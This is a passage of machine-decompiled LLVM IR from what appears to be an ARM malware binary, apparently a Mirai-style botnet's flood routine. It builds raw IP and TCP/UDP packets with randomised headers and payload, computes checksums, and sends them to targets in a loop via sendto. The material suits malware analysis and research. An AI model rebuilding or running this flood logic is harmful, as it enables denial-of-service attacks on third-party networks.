  %v6_9dc0 = inttoptr i32 %v5_9dc0 to i32*
  %v7_9dc0 = load i32, i32* %v6_9dc0, align 4
  store i32 %v7_9dc0, i32* @r4, align 4
  %v1_9dc4 = inttoptr i32 %v7_9dc0 to i8*
  %v2_9dc4 = load i8, i8* %v1_9dc4, align 1
  %tmp101 = urem i8 %v2_9dc4, 16
  %v1_9dc8 = zext i8 %tmp101 to i32
  %v1_9dcc = or i32 %v1_9dc8, 64
  store i32 %v1_9dcc, i32* %r3.global-to-local, align 4
  %v1_9dd0 = trunc i32 %v1_9dcc to i8
  store i8 %v1_9dd0, i8* %v1_9dc4, align 1
  %v0_9dd4 = load i32, i32* @r4, align 4
  %v1_9dd4 = inttoptr i32 %v0_9dd4 to i8*
  %v2_9dd4 = load i8, i8* %v1_9dd4, align 1
  %v0_9dd8 = load i32, i32* @r7, align 4
  %tmp76 = mul i32 %v0_9dd8, 256
  %v1_9de0 = and i8 %v2_9dd4, -16
  %v1_9de4 = or i8 %v1_9de0, 5
  %v1_9de8 = and i32 %tmp76, 65280
  %tmp77 = udiv i32 %v0_9dd8, 256
  %v4_9dec = urem i32 %tmp77, 256
  %v5_9dec = or i32 %v4_9dec, %v1_9de8
  store i32 %v5_9dec, i32* %r2.global-to-local, align 4
  %v0_9df0 = load i32, i32* @fp, align 4
  %v1_9df0 = urem i32 %v0_9df0, 256
  store i32 %v1_9df0, i32* %r0.global-to-local, align 4
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v3_9df8 = udiv i32 %v0_9df0, 256
  store i32 %v3_9df8, i32* %r1.global-to-local, align 4
  store i8 %v1_9de4, i8* %v1_9dd4, align 1
  %v0_9e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e00 = load i32, i32* %r0.global-to-local, align 4
  %v4_9e00 = mul i32 %v1_9e00, 256
  %v5_9e00 = or i32 %v4_9e00, %v0_9e00
  store i32 %v5_9e00, i32* %r1.global-to-local, align 4
  store i32 %v6_9940, i32* %r0.global-to-local, align 4
  %v2_9e08 = load i32, i32* @r4, align 4
  %v3_9e08 = add i32 %v2_9e08, 1
  %v4_9e08 = inttoptr i32 %v3_9e08 to i8*
  store i8 %v5_9960, i8* %v4_9e08, align 1
  %v0_9e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9e0c = trunc i32 %v0_9e0c to i16
  %v2_9e0c = load i32, i32* @r4, align 4
  %v3_9e0c = add i32 %v2_9e0c, 4
  %v4_9e0c = inttoptr i32 %v3_9e0c to i16*
  store i16 %v1_9e0c, i16* %v4_9e0c, align 2
  %v0_9e10 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e10 = icmp eq i32 %v0_9e10, 0
  store i1 %v2_9e10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_999c, i32* %r1.global-to-local, align 4
  %v0_9e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i16
  %v2_9e18 = load i32, i32* @r4, align 4
  %v3_9e18 = add i32 %v2_9e18, 2
  %v4_9e18 = inttoptr i32 %v3_9e18 to i16*
  store i16 %v1_9e18, i16* %v4_9e18, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9e10, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_9d3c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_9d3c, %bb78
  %v0_9e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e24 = trunc i32 %v0_9e24 to i8
  %v2_9e24 = load i32, i32* @r4, align 4
  %v3_9e24 = add i32 %v2_9e24, 8
  %v4_9e24 = inttoptr i32 %v3_9e24 to i8*
  store i8 %v1_9e24, i8* %v4_9e24, align 1
  %v0_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i8
  %v2_9e28 = load i32, i32* @r4, align 4
  %v3_9e28 = add i32 %v2_9e28, 9
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  %v0_9e2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e2c, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_9e2c = trunc i32 %v1_9e2c to i16
  %v3_9e2c = load i32, i32* @r4, align 4
  %v4_9e2c = add i32 %v3_9e2c, 6
  %v5_9e2c = inttoptr i32 %v4_9e2c to i16*
  store i16 %v2_9e2c, i16* %v5_9e2c, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  store i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32* %r2.global-to-local, align 4
  %v2_9e34 = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_9e34, i32* %r1.global-to-local, align 4
  %v1_9e38 = load i32, i32* @r4, align 4
  %v2_9e38 = add i32 %v1_9e38, 12
  %v3_9e38 = inttoptr i32 %v2_9e38 to i32*
  store i32 %v2_9e34, i32* %v3_9e38, align 4
  %v3_9e3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v4_9e44 = mul i32 %v3_9e3c, 16
  %v5_9e44 = add i32 %v4_9e44, %v2_9918
  %v6_9e44 = inttoptr i32 %v5_9e44 to i32*
  %v7_9e44 = load i32, i32* %v6_9e44, align 4
  store i32 %v7_9e44, i32* %r2.global-to-local, align 4
  store i32 %v5_9e44, i32* %r3.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, 16
  %v3_9e50 = inttoptr i32 %v2_9e50 to i32*
  store i32 %v7_9e44, i32* %v3_9e50, align 4
  %v0_9e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 12
  %v2_9e54 = inttoptr i32 %v1_9e54 to i16*
  %v3_9e54 = load i16, i16* %v2_9e54, align 2
  %v4_9e54 = zext i16 %v3_9e54 to i32
  store i32 %v4_9e54, i32* %r0.global-to-local, align 4
  %v1_9e58 = add i32 %v0_9e54, 8
  %v2_9e58 = inttoptr i32 %v1_9e58 to i32*
  %v3_9e58 = load i32, i32* %v2_9e58, align 4
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v2_9e5c = load i32, i32* @r4, align 4
  %v3_9e5c = add i32 %v2_9e5c, 20
  %v4_9e5c = inttoptr i32 %v3_9e5c to i16*
  store i16 %v3_9e54, i16* %v4_9e5c, align 2
  %v0_9e60 = load i32, i32* @r4, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r8, align 4
  %v1_9e64 = add i32 %v0_9e60, 33
  %v2_9e64 = inttoptr i32 %v1_9e64 to i8*
  %v3_9e64 = load i8, i8* %v2_9e64, align 1
  %v4_9e64 = zext i8 %v3_9e64 to i32
  store i32 %v4_9e64, i32* %r2.global-to-local, align 4
  %v0_9e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e68 = add i32 %v0_9e60, 24
  %v3_9e68 = inttoptr i32 %v2_9e68 to i32*
  store i32 %v0_9e68, i32* %v3_9e68, align 4
  %v0_9e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e6c = or i32 %v0_9e6c, 1
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v0_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e70 = add i32 %v0_9e70, 4
  %v2_9e70 = inttoptr i32 %v1_9e70 to i32*
  %v3_9e70 = load i32, i32* %v2_9e70, align 4
  store i32 %v3_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e70, 14
  %v2_9e74 = inttoptr i32 %v1_9e74 to i16*
  %v3_9e74 = load i16, i16* %v2_9e74, align 2
  %v4_9e74 = zext i16 %v3_9e74 to i32
  store i32 %v4_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v1_9e6c to i8
  %v2_9e78 = load i32, i32* @r8, align 4
  %v3_9e78 = add i32 %v2_9e78, 13
  %v4_9e78 = inttoptr i32 %v3_9e78 to i8*
  store i8 %v1_9e78, i8* %v4_9e78, align 1
  %v0_9e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e7c = trunc i32 %v0_9e7c to i16
  %v2_9e7c = load i32, i32* @r8, align 4
  %v3_9e7c = add i32 %v2_9e7c, 2
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 %v1_9e7c, i16* %v4_9e7c, align 2
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 12
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v4_9e80, i32* %r3.global-to-local, align 4
  %v1_9e84 = add i32 %v0_9e80, 13
  %v2_9e84 = inttoptr i32 %v1_9e84 to i8*
  %v3_9e84 = load i8, i8* %v2_9e84, align 1
  %v4_9e84 = zext i8 %v3_9e84 to i32
  %tmp102 = urem i8 %v3_9e80, 16
  %v1_9e88 = zext i8 %tmp102 to i32
  %v1_9e8c = or i32 %v1_9e88, 128
  store i32 %v1_9e8c, i32* %r3.global-to-local, align 4
  %v1_9e90 = or i32 %v4_9e84, 16
  store i32 %v1_9e90, i32* %r2.global-to-local, align 4
  %v0_9e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e94 = add i32 %v0_9e80, 8
  %v3_9e94 = inttoptr i32 %v2_9e94 to i32*
  store i32 %v0_9e94, i32* %v3_9e94, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r8, align 4
  %v3_9e98 = add i32 %v2_9e98, 12
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e9c = trunc i32 %v0_9e9c to i8
  %v2_9e9c = load i32, i32* @r8, align 4
  %v3_9e9c = add i32 %v2_9e9c, 13
  %v4_9e9c = inttoptr i32 %v3_9e9c to i8*
  store i8 %v1_9e9c, i8* %v4_9e9c, align 1
  %v0_9ea0 = call i32 @rand_next()
  %v1_9ea0 = trunc i32 %v0_9ea0 to i16
  store i32 %v0_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r8, align 4
  %v1_9ea8 = add i32 %v0_9ea8, 13
  %v2_9ea8 = inttoptr i32 %v1_9ea8 to i8*
  %v3_9ea8 = load i8, i8* %v2_9ea8, align 1
  %v4_9ea8 = zext i8 %v3_9ea8 to i32
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v1_9eb0 = and i32 %v4_9ea8, 223
  %v5_9eb4 = or i32 %v1_9eb0, %v4_9eb4
  store i32 %v5_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = trunc i32 %v5_9eb4 to i8
  store i8 %v1_9eb8, i8* %v2_9ea8, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9ec0 = load i32, i32* @r8, align 4
  %v1_9ec0 = add i32 %v0_9ec0, 13
  %v2_9ec0 = inttoptr i32 %v1_9ec0 to i8*
  %v3_9ec0 = load i8, i8* %v2_9ec0, align 1
  %v4_9ec0 = zext i8 %v3_9ec0 to i32
  store i32 %v1_9ec4, i32* %r3.global-to-local, align 4
  %v1_9ec8 = and i32 %v4_9ec0, 239
  %v5_9ecc = or i32 %v1_9ec8, %v4_9ecc
  store i32 %v5_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = trunc i32 %v5_9ecc to i8
  store i8 %v1_9ed0, i8* %v2_9ec0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r8, align 4
  %v1_9ed8 = add i32 %v0_9ed8, 13
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v1_9edc, i32* %r2.global-to-local, align 4
  %v1_9ee0 = and i32 %v4_9ed8, 247
  %v5_9ee4 = or i32 %v1_9ee0, %v4_9ee4
  store i32 %v5_9ee4, i32* %r3.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v5_9ee4 to i8
  store i8 %v1_9ee8, i8* %v2_9ed8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r8, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 13
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef0 = load i8, i8* %v2_9ef0, align 1
  %v4_9ef0 = zext i8 %v3_9ef0 to i32
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  %v1_9ef8 = and i32 %v4_9ef0, 251
  %v5_9efc = or i32 %v1_9ef8, %v4_9efc
  store i32 %v5_9efc, i32* %r2.global-to-local, align 4
  %v1_9f00 = trunc i32 %v5_9efc to i8
  store i8 %v1_9f00, i8* %v2_9ef0, align 1
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  %v0_9f08 = load i32, i32* @r8, align 4
  %v1_9f08 = add i32 %v0_9f08, 13
  %v2_9f08 = inttoptr i32 %v1_9f08 to i8*
  %v3_9f08 = load i8, i8* %v2_9f08, align 1
  %v4_9f08 = zext i8 %v3_9f08 to i32
  store i32 %v1_9f0c, i32* %r2.global-to-local, align 4
  %v1_9f10 = and i32 %v4_9f08, 253
  %v4_9f14 = or i32 %v1_9f10, %v3_9f14
  store i32 %v4_9f14, i32* %r3.global-to-local, align 4
  %v1_9f18 = trunc i32 %v4_9f14 to i8
  store i8 %v1_9f18, i8* %v2_9f08, align 1
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r8, align 4
  %v1_9f20 = add i32 %v0_9f20, 13
  %v2_9f20 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f20 = load i8, i8* %v2_9f20, align 1
  %v4_9f20 = zext i8 %v3_9f20 to i32
  %v1_9f28 = and i32 %v4_9f20, 254
  store i32 %v1_9f28, i32* %r2.global-to-local, align 4
  %v2_9f2c = or i32 %v1_9f28, %v1_9f24
  store i32 %v2_9f2c, i32* %r3.global-to-local, align 4
  %v1_9f30 = trunc i32 %v2_9f2c to i8
  store i8 %v1_9f30, i8* %v2_9f20, align 1
  %v3_9f34 = load i32, i32* @r8, align 4
  %v4_9f34 = add i32 %v3_9f34, 14
  %v5_9f34 = inttoptr i32 %v4_9f34 to i16*
  store i16 %v1_9ea0, i16* %v5_9f34, align 2
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r4, align 4
  %v1_9f3c = add i32 %v0_9f3c, 40
  store i32 %v1_9f3c, i32* %r0.global-to-local, align 4
  %v2_9f40 = inttoptr i32 %v1_9f3c to i16*
  %v3_9f40 = call i32 @rand_str(i16* %v2_9f40, i32 %v6_9a9c)
  store i32 %v3_9f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c94

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9b08
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a9c, 40
  br label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9f48
  %storemerge6.pre-phi = phi i32 [ %v1_9d98, %dec_label_pc_9ca8 ], [ %.pre, %dec_label_pc_9f48 ]
  %v0_9f6c26 = phi i32 [ %v1_9c9c, %dec_label_pc_9ca8 ], [ 0, %dec_label_pc_9f48 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a9c, 65536
  %storemerge = add i32 %v6_9a9c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f58 = add i32 %storemerge4, 1310720
  store i32 %v1_9f58, i32* %r2.global-to-local, align 4
  %tmp82 = udiv i32 %v1_9f58, 256
  %v3_9f60 = and i32 %tmp82, 65280
  store i32 %v3_9f60, i32* %r3.global-to-local, align 4
  %v4_9f64 = udiv i32 %v1_9f58, 16777216
  %v5_9f64 = or i32 %v3_9f60, %v4_9f64
  store i32 %v5_9f64, i32* @r8, align 4
  %v2_a090 = icmp eq i32 %v1_9abc, 0
  br label %dec_label_pc_9f68

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074, %dec_label_pc_9f58
  %v0_9f6c = phi i32 [ %v0_9f6c26, %dec_label_pc_9f58 ], [ 0, %dec_label_pc_a074 ], [ 0, %dec_label_pc_9f68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f6c = icmp eq i32 %v0_9f6c, 0
  store i1 %v2_9f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f6c, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f78
  %v1_9f84 = phi i32 [ %v1_a064, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9f78 ]
  store i32 %v2_9928, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %r3.global-to-local, align 4
  %v4_9f84 = mul i32 %v1_9f84, 4
  %v5_9f84 = add i32 %v4_9f84, %v2_9928
  %v6_9f84 = inttoptr i32 %v5_9f84 to i32*
  %v7_9f84 = load i32, i32* %v6_9f84, align 4
  store i32 %v7_9f84, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_9f8c = load i32, i32* @fp, align 4
  %v9_9f8c = icmp eq i32 %v0_9f8c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_9f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f90 = add i32 %v7_9f84, 20
  store i32 %v1_9f90, i32* @r5, align 4
  br i1 %v9_9f8c, label %dec_label_pc_a088, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f7c
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a09c

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_a088, %dec_label_pc_a09c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9fa8 = load i32, i32* @r4, align 4
  %v3_9fa8 = add i32 %v2_9fa8, 10
  %v4_9fa8 = inttoptr i32 %v3_9fa8 to i16*
  store i16 0, i16* %v4_9fa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9fb0 = load i32, i32* @r4, align 4
  store i32 %v0_9fb0, i32* @r0, align 4
  %v2_9fb4 = call i32 @checksum_generic(i32 %v0_9fb0, i32 20)
  %v3_9fb4 = trunc i32 %v2_9fb4 to i16
  store i32 %v2_9fb4, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_9918, i32* %r2.global-to-local, align 4
  %v3_9fc0 = mul i32 %v3_9fb8, 16
  %v2_9fc4 = add i32 %v3_9fc0, %v2_9918
  store i32 %v2_9fc4, i32* %r1.global-to-local, align 4
  %v1_9fc8 = add i32 %v2_9fc4, 4
  %v2_9fc8 = inttoptr i32 %v1_9fc8 to i32*
  %v3_9fc8 = load i32, i32* %v2_9fc8, align 4
  %v3_9fcc = mul i32 %v3_9fc8, 65536
  store i32 %v3_9fcc, i32* %ip.global-to-local, align 4
  %tmp83 = mul i32 %v3_9fc8, 256
  %v1_9fd4 = and i32 %tmp83, 65280
  %tmp84 = udiv i32 %v3_9fc8, 256
  %v4_9fd8 = urem i32 %tmp84, 256
  %v5_9fd8 = or i32 %v4_9fd8, %v1_9fd4
  store i32 %v5_9fd8, i32* %r3.global-to-local, align 4
  %v1_9fdc = add i32 %v3_9fc8, 1
  store i32 %v1_9fdc, i32* %r2.global-to-local, align 4
  store i32 %v1_9fdc, i32* %v2_9fc8, align 4
  %v0_9fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 4
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  store i32 %v0_9fe4, i32* %v3_9fe4, align 4
  %v0_9fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fe8 = add i32 %v0_9fe8, 8
  %v2_9fe8 = inttoptr i32 %v1_9fe8 to i32*
  %v3_9fe8 = load i32, i32* %v2_9fe8, align 4
  %tmp85 = mul i32 %v3_9fe8, 256
  %v1_9ff4 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_9fe8, 256
  %v4_9ff8 = urem i32 %tmp86, 256
  %v5_9ff8 = or i32 %v4_9ff8, %v1_9ff4
  %v1_9ffc = load i32, i32* @r5, align 4
  %v2_9ffc = add i32 %v1_9ffc, 8
  %v3_9ffc = inttoptr i32 %v2_9ffc to i32*
  store i32 %v5_9ff8, i32* %v3_9ffc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a004 = load i32, i32* @r4, align 4
  %v4_a004 = add i32 %v3_a004, 10
  %v5_a004 = inttoptr i32 %v4_a004 to i16*
  store i16 %v3_9fb4, i16* %v5_a004, align 2
  %v0_a008 = load i32, i32* @r5, align 4
  store i32 %v0_a008, i32* @r1, align 4
  %v0_a00c = load i32, i32* %r3.global-to-local, align 4
  %v1_a00c = trunc i32 %v0_a00c to i16
  %v3_a00c = add i32 %v0_a008, 16
  %v4_a00c = inttoptr i32 %v3_a00c to i16*
  store i16 %v1_a00c, i16* %v4_a00c, align 2
  %v0_a010 = load i32, i32* @r8, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @sl, align 4
  store i32 %v0_a014, i32* %r3.global-to-local, align 4
  %v0_a018 = load i32, i32* @r4, align 4
  store i32 %v0_a018, i32* %r0.global-to-local, align 4
  %v4_a01c = call i32 @checksum_tcpudp(i32 %v0_a018, i32 %v0_a008, i32 %v0_a010, i32 %v0_a014)
  %v5_a01c = trunc i32 %v4_a01c to i16
  store i32 %v4_a01c, i32* %r0.global-to-local, align 4
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a028 = mul i32 %v3_a020, 32
  store i32 %v3_a028, i32* %lr.global-to-local, align 4
  %v3_a02c = load i32, i32* @r5, align 4
  %v4_a02c = add i32 %v3_a02c, 16
  %v5_a02c = inttoptr i32 %v4_a02c to i16*
  store i16 %v5_a01c, i16* %v5_a02c, align 2
  %v0_a030 = load i32, i32* %lr.global-to-local, align 4
  %v1_a030 = load i32, i32* %r3.global-to-local, align 4
  %tmp103 = mul i32 %v1_a030, -8
  %v5_a030 = add i32 %v0_a030, %tmp103
  store i32 %v5_a030, i32* %lr.global-to-local, align 4
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a034 = add i32 %v0_a034, 2
  %v2_a034 = inttoptr i32 %v1_a034 to i16*
  %v3_a034 = load i16, i16* %v2_a034, align 2
  %v4_a034 = zext i16 %v3_a034 to i32
  store i32 %v4_a034, i32* @r5, align 4
  %v1_a038 = load i32, i32* %ip.global-to-local, align 4
  %v2_a038 = add i32 %v1_a038, %v5_a030
  store i32 %v2_a038, i32* @lr, align 4
  %v3_a03c = add i32 %v2_a038, 2
  %v4_a03c = inttoptr i32 %v3_a03c to i16*
  store i16 %v3_a034, i16* %v4_a03c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a048 = load i32, i32* @r4, align 4
  store i32 %v0_a048, i32* %r1.global-to-local, align 4
  %v0_a04c = load i32, i32* @sb, align 4
  store i32 %v0_a04c, i32* %r0.global-to-local, align 4
  %v0_a050 = load i32, i32* @r7, align 4
  store i32 %v0_a050, i32* %r2.global-to-local, align 4
  %v0_a054 = load i32, i32* @lr, align 4
  %v6_a05c = call i32 @__libc_sendto(i32 %v0_a04c, i32 %v0_a048, i32 %v0_a050, i32 16384, i32 %v0_a054, i32 16)
  %v3_a060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a060, i32* %r3.global-to-local, align 4
  %v1_a064 = add i32 %v3_a060, 1
  store i32 %v1_a064, i32* %r0.global-to-local, align 4
  %v0_a068 = load i32, i32* @r6, align 4
  %v9_a068 = icmp eq i32 %v0_a068, %v1_a064
  store i1 %v9_a068, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a064, i32* %stack_var_-44, align 4
  %v8_a070 = icmp sgt i32 %v0_a068, %v1_a064
  br i1 %v8_a070, label %dec_label_pc_9f7c, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9fa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a078 = icmp eq i32 %v0_a068, 0
  store i1 %v2_a078, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a078, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f7c
  %v0_a088 = call i32 @rand_next()
  %v1_a088 = trunc i32 %v0_a088 to i16
  store i32 %v0_a088, i32* %r0.global-to-local, align 4
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  %v3_a094 = load i32, i32* @r4, align 4
  %v4_a094 = add i32 %v3_a094, 4
  %v5_a094 = inttoptr i32 %v4_a094 to i16*
  store i16 %v1_a088, i16* %v5_a094, align 2
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a088.dec_label_pc_a09c_crit_edge

dec_label_pc_a088.dec_label_pc_a09c_crit_edge:    ; preds = %dec_label_pc_a088
  %v0_a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a088.dec_label_pc_a09c_crit_edge, %dec_label_pc_9f98
  %v0_a09c = phi i32 [ %v0_a09c.pre, %dec_label_pc_a088.dec_label_pc_a09c_crit_edge ], [ %v7_9f84, %dec_label_pc_9f98 ]
  %v1_a09c = add i32 %v0_a09c, 40
  store i32 %v1_a09c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v2_a0a4 = inttoptr i32 %v1_a09c to i16*
  %v3_a0a4 = call i32 @rand_str(i16* %v2_a0a4, i32 %v6_9a9c)
  store i32 %v3_a0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fa4

; uselistorder directives
  uselistorder i32 %v0_a088, { 1, 0 }
  uselistorder i32 %v1_a064, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a030, { 1, 0 }
  uselistorder i32 %v4_a01c, { 1, 0 }
  uselistorder i32 %v3_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9fb4, { 1, 0 }
  uselistorder i1 %v2_a090, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9ea0, { 1, 0 }
  uselistorder i32 %v0_9dd8, { 1, 0 }
  uselistorder i32 %v5_9d6c, { 1, 0 }
  uselistorder i32 %v0_9d2c, { 1, 0 }
  uselistorder i32 %v0_9ce8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c84, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9c10, { 1, 0 }
  uselistorder i32 %v6_9c08, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9c38, { 1, 0 }
  uselistorder i32 %v4_9c4c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b94, { 1, 0, 2 }
  uselistorder i32 %v0_9d44, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b84, { 1, 0 }
  uselistorder i1 %v7_9b7c, { 1, 0, 2 }
  uselistorder i1 %v7_9b30, { 1, 0 }
  uselistorder i32 %v3_9b2c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9f0c, { 1, 0 }
  uselistorder i32 %v1_9ef4, { 1, 0 }
  uselistorder i32 %v1_9edc, { 1, 0 }
  uselistorder i32 %v1_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v3_9c44, { 1, 0 }
  uselistorder i1 %v2_9c60, { 1, 0 }
  uselistorder i32 %v1_9c5c, { 1, 0 }
  uselistorder i32 %v4_9c58, { 2, 0, 1 }
  uselistorder i32 %v2_9b6c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9b08, { 1, 0 }
  uselistorder i1 %v7_9b00, { 1, 0 }
  uselistorder i1 %v7_9ad4, { 1, 0 }
